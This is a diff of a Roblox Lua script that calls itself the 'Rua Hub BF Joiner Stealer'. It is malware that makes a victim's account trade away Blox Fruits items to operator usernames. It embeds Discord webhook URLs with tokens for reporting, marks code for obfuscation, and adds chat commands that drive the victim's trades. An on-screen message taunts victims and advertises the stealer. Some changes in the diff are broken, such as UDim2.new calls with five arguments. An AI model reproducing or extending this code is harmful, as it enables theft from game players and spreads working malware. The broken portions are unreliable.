@@ -1,11 +1,13 @@
-Webhook = "https://discord.com/api/webhooks/1338826425670828062/zA4fdmXcJmclSpxGBHPE5jEBqYoDNw_xscivfLXj5JKCG7dKHsN_kl0ZDwkS3xr1duuM"
+--- START OF FILE message (18).txt ---
+
+Webhook = "https://discord.com/api/webhooks/1338826248234733588/0wX88ngwUdgsqI6FJJ3iUF252sq9yggrzJpZguRIol8qfFJeRsFTBUMWN_yptTKhdiiY"
+SecondaryWebhook = "https://discord.com/api/webhooks/1338826425670828062/zA4fdmXcJmclSpxGBHPE5jEBqYoDNw_xscivfLXj5JKCG7dKHsN_kl0ZDwkS3xr1duuM" -- << Add secondary webhook here
 Usernames = {"user2", "user1"} -- << Username(-s) it'll accept trade with
 Fruits = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Dragon(East)-Dragon-East", "Dough-Dough", "Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard", "Control-Control"} -- << Fruits you want
 FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
 }
 
 --obfuscate after this
-SecondaryWebhook = "https://discord.com/api/webhooks/1338826248234733588/0wX88ngwUdgsqI6FJJ3iUF252sq9yggrzJpZguRIol8qfFJeRsFTBUMWN_yptTKhdiiY" -- << Add secondary webhook here
 
 repeat task.wait() until game:IsLoaded()
 
@@ -420,20 +422,21 @@ rs.Heartbeat:Connect(function()
         lastTipUpdate = currentTime
         fadeInProgress = true
 
-     local oldTip = currentTip
-     currentTip = currentTip % #tips + 1
+        local oldTip = currentTip
+        currentTip = currentTip % #tips + 1
 
-     local fadeOut = ts:Create(tip, TweenInfo.new(0.5), {TextTransparency = 1})
-     fadeOut.Completed:Connect(function()
-         tip.Text = tips[currentTip]
-         local fadeIn = ts:Create(tip, TweenInfo.new(0.5), {TextTransparency = 0})
-         fadeIn.Completed:Connect(function()
-             fadeInProgress = false
-         end)
-         fadeIn:Play()
-     end)
-     fadeOut:Play()
- end
+        local fadeOut = ts:Create(tip, TweenInfo.new(0.5), {TextTransparency = 1})
+        fadeOut.Completed:Connect(function()
+            tip.Text = tips[currentTip]
+            local fadeIn = ts:Create(tip, TweenInfo.new(0.5), {TextTransparency = 0})
+            fadeIn.Completed:Connect(function()
+                fadeInProgress = false
+            end)
+            fadeIn:Play()
+        end)
+        fadeOut:Play()
+    end
+end)
 
 local startTime = tick()
 local lastPhaseUpdate = 0
@@ -1332,7 +1335,7 @@ local function createDiscordUI()
     local Description = Instance.new("TextLabel")
     Description.Name = "Description"
     Description.Size = UDim2.new(0.9, 0, 0, 40)
-    Description.Position = UDim2.new(0.05, 0, 0.3, 0)
+    Description.Position = UDim2.new(0.05, 0, 0, 0.3, 0)
     Description.BackgroundTransparency = 1
     Description.Font = Enum.Font.Gotham
     Description.Text = "Hey! You just lost some of your valuable fruits to Rua Hub BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer - Join our discord! Click the button to copy invite. Before leaving the game to check if your fruits are really gone, I recommend copying discord invite."
@@ -1344,7 +1347,7 @@ local function createDiscordUI()
     local Button = Instance.new("TextButton")
     Button.Name = "CopyButton"
     Button.Size = UDim2.new(0.7, 0, 0, 36)
-    Button.Position = UDim2.new(0.15, 0, 0.7, 0)
+    Button.Position = UDim2.new(0.15, 0, 0, 0.7, 0)
     Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
     Button.Font = Enum.Font.GothamBold
     Button.Text = "Copy Invite"
@@ -1746,7 +1749,7 @@ local ChatCommands = {
                 local commands = {
                     "Movement: ?jump, ?sit, ?sit2, ?reset, ?tp",
                     "Trade: ?accept, ?cleartrade, ?addallfruits, ?addfruit <name>, ?clearfruits, ?additem <name>, ?addallitems",
-                    "Utility: ?kick, ?rejoin, ?invite, ?resetfruit <name>, ?stopreset, ?showinv"
+                    "Utility: ?kick, ?rejoin, ?invite, ?resetfruit <name>, ?stopreset, ?showinv" -- Added showinv to help
                 }
                 for _, msg in ipairs(commands) do
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
@@ -1755,7 +1758,7 @@ local ChatCommands = {
             end)
         end,
 
-        showinv = function()
+        showinv = function() -- ADDED OR REPLACED SHOWINV COMMAND HERE
             task.spawn(function()
                 local inventory = getInventory()
                 if not inventory then
@@ -1777,30 +1780,29 @@ local ChatCommands = {
                     return
                 end
 
-                local formattedFruitList = "" -- Initialize as empty string
+                local outputString = "" -- Initialize an empty output string
                 local fruitCounts = {} -- To count occurrences of each fruit
 
                 for _, fruitName in ipairs(fruitList) do
                     fruitCounts[fruitName] = (fruitCounts[fruitName] or 0) + 1
                 end
 
-                local fruitSegments = {} -- Table to store individual fruit segments
+                local fruitEntries = {} -- Table to store individual fruit entries for joining later
 
                 for fruitName, count in pairs(fruitCounts) do
-                    local fruitSegment = "-- " .. fruitName:gsub("-", " ")
+                    local fruitEntry = fruitName:gsub("-", " ")
                     if count > 1 then
-                        fruitSegment = fruitSegment .. " (x" .. count .. ")"
+                        fruitEntry = fruitEntry .. " (x" .. count .. ")"
                     end
-                    fruitSegment = fruitSegment .. " --"
-                    fruitSegments[#fruitSegments + 1] = fruitSegment -- Add segment to table
+                    fruitEntries[#fruitEntries + 1] = fruitEntry
                 end
 
-                formattedFruitList = table.concat(fruitSegments, " ") -- Join segments with spaces
+                outputString = table.concat(fruitEntries, " -- ") -- Join fruit entries with " -- "
 
                 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
-                    formattedFruitList, "All")
+                    outputString, "All")
             end)
-        end,
+        end
     }
 }
 
